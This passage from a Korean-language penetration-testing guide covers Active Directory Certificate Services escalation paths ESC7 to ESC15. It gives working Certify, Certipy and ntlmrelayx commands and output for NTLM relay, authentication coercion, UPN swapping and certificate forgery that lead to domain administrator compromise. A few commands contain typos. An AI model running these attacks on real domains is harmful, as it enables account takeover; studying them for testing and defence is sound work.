요약하면, 이전에는 ESC7 중 “권한이 더 낮은” 쪽으로 여겨졌던 *Manage Certificates*를 이제 CA configuration을 변경하거나 더 제한적인 *Manage CA* 권한을 요구하지 않고도 완전한 권한 상승 또는 장기적인 persistence에 활용할 수 있습니다.

#### Certify 2.0으로 primitive 악용하기

1. **pending 상태로 남을 certificate request를 제출합니다.** manager approval이 필요한 template을 사용하면 이를 강제할 수 있습니다.
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **새 `manage-ca` 명령을 사용해 보류 중인 요청에 사용자 지정 확장을 추가합니다**:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *템플릿에 *Certificate Issuance Policies* 확장이 이미 정의되어 있지 않다면, 위 값은 발급 후에도 유지됩니다.*

3. **요청을 발급합니다**(사용자 역할에 *인증서 관리* 승인 권한도 있는 경우). 그렇지 않으면 운영자가 승인할 때까지 기다립니다. 발급되면 인증서를 다운로드합니다:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. 생성된 인증서에는 이제 악성 issuance-policy OID가 포함되어 있으며, 이후 공격(예: ESC13, domain escalation 등)에 사용할 수 있습니다.

> 참고: 동일한 공격은 Certipy ≥ 4.7에서 `ca` 명령과 `-set-extension` 매개변수를 통해 실행할 수 있습니다.

## AD CS HTTP Endpoint로 NTLM Relay – ESC8

### 설명

> [!TIP]
> **AD CS가 설치된** 환경에서 취약한 **web enrollment endpoint**가 존재하고 **domain computer 등록 및 client authentication을 허용하는 certificate template**(예: 기본 **`Machine`** template)이 하나 이상 게시되어 있다면, spooler service가 활성화된 **모든 컴퓨터를 공격자가 침해할 수 있습니다**!

AD CS는 여러 **HTTP 기반 등록 방식**을 지원하며, 관리자가 설치할 수 있는 추가 서버 역할을 통해 제공됩니다. HTTP 기반 인증서 등록을 위한 이러한 인터페이스는 **NTLM relay 공격**에 취약합니다. 공격자는 **침해된 시스템에서 inbound NTLM으로 인증하는 모든 AD 계정을 사칭할 수 있습니다**. 피해자 계정을 사칭하는 동안 공격자는 이러한 web interface에 접속해 `User` 또는 `Machine` certificate template을 사용하여 client authentication 인증서를 **요청할 수 있습니다**.

- **web enrollment interface**(`http://<caserver>/certsrv/`에서 제공되는 구형 ASP 애플리케이션)는 기본적으로 HTTP만 사용하므로 NTLM relay 공격에 대한 보호 기능을 제공하지 않습니다. 또한 Authorization HTTP header를 통해 NTLM 인증만 명시적으로 허용하므로 Kerberos와 같은 더 안전한 인증 방식은 사용할 수 없습니다.
- **Certificate Enrollment Service**(CES), **Certificate Enrollment Policy**(CEP) Web Service 및 **Network Device Enrollment Service**(NDES)는 기본적으로 Authorization HTTP header를 통한 negotiate 인증을 지원합니다. Negotiate 인증은 Kerberos와 **NTLM을 모두 지원**하므로 공격자는 relay 공격 중에 인증을 **NTLM으로 다운그레이드할 수 있습니다**. 이러한 web service는 기본적으로 HTTPS를 활성화하지만, HTTPS만으로는 **NTLM relay 공격을 방지할 수 없습니다**. HTTPS 서비스에 대한 NTLM relay 공격을 방지하려면 HTTPS와 channel binding을 함께 사용해야 합니다. 안타깝게도 AD CS는 channel binding에 필요한 Extended Protection for Authentication을 IIS에서 활성화하지 않습니다.<sup>[[6]](#references)</sup>

NTLM relay 공격의 일반적인 **문제점**은 NTLM 세션의 **짧은 지속 시간**과 **NTLM signing을 요구하는** 서비스와 공격자가 상호작용할 수 없다는 점입니다.

하지만 NTLM relay 공격을 악용해 사용자의 인증서를 획득하면 이러한 제한을 극복할 수 있습니다. 세션 지속 시간은 인증서의 유효 기간에 따라 결정되며, 인증서는 **NTLM signing을 요구하는** 서비스에서도 사용할 수 있습니다. 탈취한 인증서를 사용하는 방법은 다음을 참조하세요:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay 공격의 또 다른 제한 사항은 피해자 계정이 **공격자가 제어하는 시스템에 인증해야 한다는 점**입니다. 공격자는 기다리거나 해당 인증을 **강제로 유도**할 수 있습니다:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **악용**

[**Certify**](https://github.com/GhostPack/Certify)의 `cas`는 **활성화된 HTTP AD CS endpoint**를 열거합니다:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 속성은 엔터프라이즈 인증 기관(CA)이 Certificate Enrollment Service(CES) 엔드포인트를 저장하는 데 사용됩니다. 다음 도구 **Certutil.exe**를 사용해 이러한 엔드포인트를 파싱하고 나열할 수 있습니다:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify를 이용한 악용

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### [Certipy](https://github.com/ly4k/Certipy)를 이용한 악용

기본적으로 Certipy는 릴레이되는 계정 이름이 `$`로 끝나는지 여부에 따라 `Machine` 또는 `User` 템플릿을 사용해 인증서를 요청합니다. 대체 템플릿은 `-template` 매개변수를 사용해 지정할 수 있습니다.

그런 다음 [PetitPotam](https://github.com/ly4k/PetitPotam)과 같은 기법을 사용해 인증을 강제할 수 있습니다. 도메인 컨트롤러를 대상으로 할 때는 `-template DomainController`를 지정해야 합니다.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### 설명

ESC9이라고 하는 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) 값이 **`msPKI-Enrollment-Flag`**에 설정되면 인증서에서 `szOID_NTDS_CA_SECURITY_EXT` SID 확장자가 생략됩니다. 이전 ESC9 예시는 KDC 호환성 동작(`StrongCertificateBindingEnforcement=1`)이나 별도의 취약한 Schannel 매핑 경로에 의존합니다. 값 `1`은 **과거의 호환성 설정**이지, 현재 기본값이 아닙니다. Microsoft에 따르면 2025년 9월 9일 Windows 보안 업데이트부터 KDC 재정의 설정은 더 이상 지원되지 않습니다. 이전 절차를 적용하기 전에 대상에 설치된 업데이트와 인증 엔드포인트를 확인하세요.<sup>[[7]](#references)</sup> [Microsoft의 롤아웃 지침](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)을 참조하세요.

이 플래그 설정이 중요한 조건은 다음과 같습니다.

- 이전 버전의 호환 가능한 KDC에서는 유효한 인증서 바인딩 정책이 매핑을 허용합니다. 또는 Schannel 엔드포인트에서 `CertificateMappingMethods` 비트 `0x4`를 통해 UPN 매핑을 별도로 활성화합니다.
- 인증서의 `msPKI-Enrollment-Flag` 설정에 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그가 지정되어 있습니다.
- 인증서에 클라이언트 인증 EKU가 지정되어 있습니다.
- 다른 계정을 손상시킬 대상 계정에 대한 `GenericWrite` 권한이 있습니다.

### 악용 시나리오

`John@corp.local`이 `Jane@corp.local`에 대한 `GenericWrite` 권한을 가지고 있고, 목표가 `Administrator@corp.local`을 손상시키는 것이라고 가정해 보겠습니다. `Jane@corp.local`이 등록할 수 있는 `ESC9` 인증서 템플릿의 `msPKI-Enrollment-Flag` 설정에는 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그가 구성되어 있습니다.

먼저 `John`의 `GenericWrite` 권한을 이용해 Shadow Credentials로 `Jane`의 해시를 획득합니다:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

이후 `Jane`의 `userPrincipalName`을 `Administrator`로 수정합니다. 이때 의도적으로 `@corp.local` 도메인 부분은 생략합니다:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

이 수정은 제약 조건을 위반하지 않습니다. `Administrator@corp.local`은 여전히 `Administrator`의 `userPrincipalName`과 구별되기 때문입니다.

그다음, 취약한 것으로 표시된 `ESC9` 인증서 템플릿을 `Jane`으로 요청합니다:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

인증서의 `userPrincipalName`에는 “object SID” 없이 `Administrator`가 표시됩니다.

이후 `Jane`의 `userPrincipalName`은 원래 값인 `Jane@corp.local`로 되돌아갑니다:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

이제 발급된 인증서로 인증을 시도하면 `Administrator@corp.local`의 NT hash를 얻습니다. 인증서에 도메인 지정이 없으므로 명령에 `-domain <domain>`을 포함해야 합니다:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Weak Certificate Mappings - ESC10

### 설명

ESC10에서는 흔히 서로 다른 두 가지 인증서 매핑 정책을 다룹니다. 관련 인증을 실제로 처리하는 엔드포인트의 설정을 확인하세요.

- 애플리케이션 서버의 TLS 클라이언트 인증서 매핑은 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel`의 Schannel `CertificateMappingMethods`에서 제어합니다. UPN 비트는 `0x4`이며, 업데이트된 시스템의 기본값은 `0x18` (`0x8 | 0x10`)입니다.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc`의 KDC `StrongCertificateBindingEnforcement`는 과거 Kerberos 인증서 바인딩 호환성을 제어했습니다. 값 `1`은 현재의 신뢰할 수 있는 기본값이 아니며, Microsoft는 2025년 9월 9일 Windows 보안 업데이트를 통해 이 재정의에 대한 지원을 종료했습니다. 이 설정만으로는 Schannel의 UPN 매핑 여부를 알 수 없습니다.<sup>[[7]](#references)</sup>

**사례 1**

과거에는 이전 버전의 KDC가 `StrongCertificateBindingEnforcement=0`을 따르는 경우가 있었습니다. 현재 패치된 시스템에서는 이 재정의가 더 이상 지원되지 않으므로 업데이트 수준을 확인하세요.

**사례 2**

Schannel 클라이언트 인증서 엔드포인트에서 `CertificateMappingMethods`의 UPN 비트(`0x4`)가 활성화된 경우입니다. 이는 KDC의 강한 바인딩 적용과는 별도의 설정이며, 등록 가능한 클라이언트 인증용 인증서와 매핑된 계정 속성에 대한 실질적인 제어 권한이 여전히 필요합니다.

### 악용 사례 1

KDC가 여전히 `StrongCertificateBindingEnforcement=0`을 따르는 이전 배포 환경에서는 계정의 `userPrincipalName`을 제어하는 것이 다른 계정으로 이어지는 약한 매핑 경로의 일부가 될 수 있습니다. 필요한 인증서 등록, 매핑, 대상 ID 및 인증 성공 여부를 각각 확인해야 합니다. `GenericWrite` ACE나 레지스트리 값만으로는 계정 탈취가 입증되지 않습니다.

예를 들어 공격자가 `Jane@corp.local`에 대한 `GenericWrite` 권한을 가지고 있고 `Administrator@corp.local`을 침해하려 한다고 가정해 보겠습니다. 이 절차는 ESC9와 유사하며 모든 인증서 템플릿을 사용할 수 있습니다.

먼저 공격자는 `GenericWrite`를 악용해 Shadow Credentials로 `Jane`의 해시를 가져옵니다.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

이후 제약 조건 위반을 피하기 위해 `@corp.local` 부분을 의도적으로 생략하고 `Jane`의 `userPrincipalName`을 `Administrator`로 변경합니다.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

이후 기본 `User` 템플릿을 사용해 `Jane` 계정으로 클라이언트 인증이 가능한 인증서를 요청합니다.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

그런 다음 `Jane`의 `userPrincipalName`을 원래 값인 `Jane@corp.local`로 되돌립니다.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

획득한 인증서로 인증하면 `Administrator@corp.local`의 NT 해시를 얻을 수 있습니다. 인증서에 도메인 정보가 없으므로 명령어에 도메인을 지정해야 합니다.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### 악용 사례 2

`CertificateMappingMethods`에 `UPN` 비트 플래그(`0x4`)가 포함되어 있는 경우, `GenericWrite` 권한이 있는 계정 A는 `userPrincipalName` 속성이 없는 모든 계정 B를 침해할 수 있습니다. 여기에는 머신 계정과 기본 제공 도메인 관리자 `Administrator`가 포함됩니다.

여기서는 `GenericWrite` 권한을 활용해 Shadow Credentials를 통해 `Jane`의 해시를 얻은 다음 `DC$@corp.local`을 침해하는 것이 목표입니다.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane`의 `userPrincipalName`은 이후 `DC$@corp.local`로 설정됩니다.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

기본 `User` 템플릿을 사용하여 `Jane` 명의로 클라이언트 인증용 인증서를 요청합니다.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

이 프로세스 후 `Jane`의 `userPrincipalName`은 원래 값으로 되돌아갑니다.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Schannel을 통해 인증하기 위해 Certipy의 `-ldap-shell` 옵션을 사용하며, 인증 성공 시 `u:CORP\DC$`로 표시됩니다.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

LDAP shell을 통해 `set_rbcd` 같은 명령을 사용하면 Resource-Based Constrained Delegation (RBCD) 공격을 수행해 도메인 컨트롤러를 장악할 수 있습니다.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

이 취약점은 `userPrincipalName`이 없거나 `sAMAccountName`과 일치하지 않는 모든 사용자 계정에도 적용됩니다. 기본적으로 `userPrincipalName`이 없고 LDAP 권한이 높은 `Administrator@corp.local` 계정은 주요 표적입니다.

## Relaying NTLM to ICPR - ESC11

### 설명

CA Server에 `IF_ENFORCEENCRYPTICERTREQUEST`가 설정되어 있지 않으면 RPC service를 통해 signing 없이 NTLM relay attacks를 수행할 수 있습니다. [여기에서 참고](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`certipy`를 사용해 `Enforce Encryption for Requests`가 비활성화되어 있는지 열거할 수 있으며, certipy는 `ESC11` 취약점을 표시합니다.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### 악용 시나리오

릴레이 서버를 설정해야 합니다:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

참고: 도메인 컨트롤러의 경우 DomainController에서 `-template`을 지정해야 합니다.

또는 [sploutchy의 impacket 포크](https://github.com/sploutchy/impacket)를 사용할 수 있습니다:

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## ADCS CA에 대한 Shell access - ESC12

### 설명

관리자는 Certificate Authority가 인증서를 "Yubico YubiHSM2"와 같은 외부 장치에 저장하도록 설정할 수 있습니다.

USB 장치가 USB 포트를 통해 CA 서버에 연결되어 있거나, CA 서버가 가상 머신인 경우 USB 장치 서버에 연결되어 있다면, Key Storage Provider가 YubiHSM에서 키를 생성하고 사용하려면 인증 키(때로는 "password"라고도 함)가 필요합니다.

이 키/password는 레지스트리의 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`에 평문으로 저장됩니다.

[여기](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)를 참고하세요.<sup>[[11]](#references)</sup>

### 악용 시나리오

Shell access를 획득했을 때 CA의 개인 키가 물리 USB 장치에 저장되어 있다면, 해당 키를 복구할 수 있습니다.

먼저 CA 인증서(공개 정보)를 가져온 다음:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

마지막으로 certutil `-sign` 명령을 사용해 CA 인증서와 개인 키로 임의의 새 인증서를 위조합니다.

## OID Group Link Abuse - ESC13

### 설명

`msPKI-Certificate-Policy` 특성을 사용하면 인증서 템플릿에 발급 정책을 추가할 수 있습니다. 발급 정책을 담당하는 `msPKI-Enterprise-Oid` 객체는 PKI OID 컨테이너의 Configuration Naming Context(CN=OID,CN=Public Key Services,CN=Services)에서 찾을 수 있습니다. 이 객체의 `msDS-OIDToGroupLink` 특성을 사용하면 정책을 AD 그룹에 연결할 수 있으며, 이를 통해 시스템은 인증서를 제시한 사용자를 해당 그룹의 구성원인 것처럼 승인할 수 있습니다. [여기에서 참조](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

즉, 사용자가 인증서 등록 권한을 가지고 있고 해당 인증서가 OID 그룹에 연결되어 있으면, 사용자는 해당 그룹의 권한을 상속할 수 있습니다.

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1)을 사용해 OIDToGroupLink를 찾습니다:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### 악용 시나리오

`certipy find` 또는 `Certify.exe find /showAllPermissions`를 사용해 사용자가 가진 권한을 찾습니다.

`John`에게 `VulnerableTemplate`에 등록할 권한이 있으면, 해당 사용자는 `VulnerableGroup` 그룹의 권한을 상속할 수 있습니다.

템플릿만 지정하면 되며, 그러면 OIDToGroupLink 권한이 포함된 인증서를 받게 됩니다.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Explicit Certificate Mapping Abuse — ESC14

### 설명

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping의 설명은 매우 상세합니다. 아래는 원문을 인용한 것입니다.<sup>[[14]](#references)</sup>

ESC14는 주로 Active Directory 사용자 또는 컴퓨터 계정의 `altSecurityIdentities` attribute를 오용하거나 안전하지 않게 구성하여 발생하는 "weak explicit certificate mapping" 취약점을 다룹니다. 이 다중값 attribute를 사용하면 관리자가 인증 목적으로 X.509 certificate를 AD 계정에 수동으로 연결할 수 있습니다. 이 명시적 매핑이 설정되면, 일반적으로 certificate의 SAN에 포함된 UPN 또는 DNS 이름이나 `szOID_NTDS_CA_SECURITY_EXT` security extension에 포함된 SID를 사용하는 기본 certificate 매핑 로직보다 우선 적용될 수 있습니다.

`altSecurityIdentities` attribute에 certificate를 식별하기 위해 사용된 문자열 값의 범위가 너무 넓거나, 쉽게 추측 가능하거나, 고유하지 않은 certificate 필드에 의존하거나, 쉽게 spoof할 수 있는 certificate 구성 요소를 사용하는 경우 매핑은 "weak"입니다. 공격자가 특권 계정에 대해 이렇게 취약하게 정의된 명시적 매핑과 일치하는 attribute를 가진 certificate를 입수하거나 제작할 수 있다면, 해당 certificate로 계정을 인증하여 가장할 수 있습니다.

잠재적으로 취약한 `altSecurityIdentities` 매핑 문자열의 예는 다음과 같습니다.

- 일반적인 Subject Common Name (CN)만으로 매핑: 예: `X509:<S>CN=SomeUser`. 공격자는 보안 수준이 낮은 출처에서 이 CN이 포함된 certificate를 얻을 수 있습니다.
- 특정 serial number 또는 subject key identifier와 같은 추가 식별 정보 없이 지나치게 일반적인 Issuer Distinguished Name (DN) 또는 Subject DN 사용: 예: `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- 공격자가 합법적으로 얻거나 위조할 수 있는 certificate에 포함할 수 있는 예측 가능한 패턴 또는 비암호화 식별자 사용 (CA를 침해했거나 ESC1과 같은 취약한 template를 찾은 경우).

`altSecurityIdentities` attribute는 다음과 같은 여러 매핑 형식을 지원합니다.

- `X509:<I>IssuerDN<S>SubjectDN` (전체 Issuer 및 Subject DN으로 매핑)
- `X509:<SKI>SubjectKeyIdentifier` (certificate의 Subject Key Identifier extension 값으로 매핑)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number로 매핑되며, Issuer DN으로 암묵적으로 한정됨) - 이는 표준 형식이 아니며, 보통 `<I>IssuerDN<SR>SerialNumber` 형식입니다.
- `X509:<RFC822>EmailAddress` (SAN의 RFC822 이름, 일반적으로 이메일 주소로 매핑)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate의 raw public key에 대한 SHA1 hash로 매핑 - 일반적으로 강력함)

이러한 매핑의 보안은 매핑에 사용된 식별자에 따라 달라집니다. Microsoft는 `X509:<RFC822>`를 포함하여 이메일 또는 subject 이름을 기반으로 한 매핑을 **weak**으로 분류합니다. Full Enforcement mode에서는 강력한 매핑이 없는 certificate가 거부되며, 2025년 9월 Windows security update 이후 Compatibility mode로 되돌리는 옵션이 제거되었습니다. 따라서 weak 매핑만으로는 현재 신뢰할 수 있는 가장 경로가 되지 않습니다. weak-mapping 시나리오를 평가하기 전에 domain controller의 실제 patch level과 certificate-mapping 동작을 확인하세요. `altSecurityIdentities`에 대한 쓰기 권한은 별도의 단서입니다. 적절한 신뢰 인증서를 가진 공격자는 유효 권한 및 certificate 검증 조건에 따라 **strong** 명시적 매핑을 추가할 수 있습니다. [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) 및 [ESC14 연구](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)를 참조하세요.

certificate 인증 실패의 원인도 진단해야 합니다. 대상 계정이 비활성화되어 있거나 password가 만료된 경우, certificate 자체가 유효하더라도 로그인이 실패할 수 있습니다.

### Abuse 시나리오

ESC14는 Active Directory (AD)의 **명시적 certificate 매핑**, 특히 `altSecurityIdentities` attribute를 대상으로 합니다. 이 attribute가 설정되어 있으면 (의도된 설정이든 잘못된 설정이든) 공격자는 매핑과 일치하는 certificate를 제시하여 계정을 가장할 수 있습니다.

#### 시나리오 A: 공격자가 `altSecurityIdentities`에 쓸 수 있음

 **전제 조건**: 공격자에게 대상 계정의 `altSecurityIdentities` attribute에 대한 쓰기 권한이 있거나, 대상 AD object에 다음 권한 중 하나를 부여할 권한이 있음:  
- `altSecurityIdentities` property 쓰기  
- `Public-Information` property 쓰기  
- 모든 property 쓰기  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### 시나리오 B: 대상에 X509RFC822 (Email) 기반 weak 매핑이 있음

- **과거/조건부 전제 조건**: 대상의 `altSecurityIdentities`에 weak X509RFC822 매핑이 있고, 공격자가 enrollee의 `mail` attribute를 수정할 수 있으며, 적절한 template가 충돌하는 SID binding 없이 해당 이메일을 client-authentication certificate에 포함해야 합니다. 인증이 성공하려면 weak 매핑을 여전히 허용하는 환경이어야 합니다. Full Enforcement는 weak 매핑만 있는 certificate를 거부합니다. `mail` attribute를 쓸 수 있다는 것만으로는 단서일 뿐입니다.
#### 시나리오 C: 대상에 X509IssuerSubject 매핑이 있음

- **전제 조건**: 대상의 `altSecurityIdentities`에 weak X509IssuerSubject 명시적 매핑이 있음. 공격자는 피해자 principal의 `cn` 또는 `dNSHostName` attribute를 대상의 X509IssuerSubject 매핑 subject와 일치하도록 설정할 수 있습니다. 그러면 공격자는 피해자 계정으로 certificate를 등록하고, 해당 certificate를 사용해 대상으로 인증할 수 있습니다.
#### 시나리오 D: 대상에 X509SubjectOnly 매핑이 있음

- **전제 조건**: 대상의 `altSecurityIdentities`에 weak X509SubjectOnly 명시적 매핑이 있음. 공격자는 피해자 principal의 `cn` 또는 `dNSHostName` attribute를 대상의 X509SubjectOnly 매핑 subject와 일치하도록 설정할 수 있습니다. 그러면 공격자는 피해자 계정으로 certificate를 등록하고, 해당 certificate를 사용해 대상으로 인증할 수 있습니다.
### 구체적인 작업
#### 시나리오 A

certificate template `Machine`의 certificate를 요청하세요.

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 인증서를 저장하고 변환합니다

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 인증(인증서 사용)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

정리 (선택 사항)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

다양한 공격 시나리오에서 사용할 수 있는 더 구체적인 공격 방법은 다음을 참조하세요: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 설명

[최초 ESC15 연구](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)에서는 V1 template에 대한 요청에 포함된 application policy가 **패치되지 않은 issuing CA**에서 설정된 Extended Key Usage를 덮어쓸 수 있는 방법을 설명합니다.<sup>[[15]](#references)</sup> 또한 후보 template은 게시되어 있어야 하고, 필요한 subject/request 속성을 허용해야 하며, 발급을 차단하는 승인 또는 서명 조건이 없어야 합니다. Enrollment 권한만으로는 취약점 악용이 가능하다는 사실이 입증되지 않습니다. Certificate Request Agent를 사용하려면 적절한 두 번째 template과 enrollment agent 제한 조건도 필요할 수 있습니다. 해당 경로를 주장하기 전에 CA의 패치 상태와 발급 결과를 확인하세요.

### 악용

[Certipy 권한 상승 문서](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)에 더 자세한 사용 예제가 있습니다.<sup>[[14]](#references)</sup>


Certipy의 `find` 명령을 사용하면 CA가 패치되지 않은 경우 ESC15에 취약할 가능성이 있는 V1 template을 식별할 수 있습니다.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### 시나리오 A: Schannel을 통한 직접 사칭

**1단계: "Client Authentication" Application Policy와 대상 UPN을 주입해 인증서를 요청합니다.** 공격자 `attacker@corp.local`은 등록자가 주체를 직접 지정할 수 있는 "WebServer" V1 템플릿을 사용해 `administrator@corp.local`을 대상으로 합니다.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: "Enrollee supplies subject"가 설정된 취약한 V1 template.
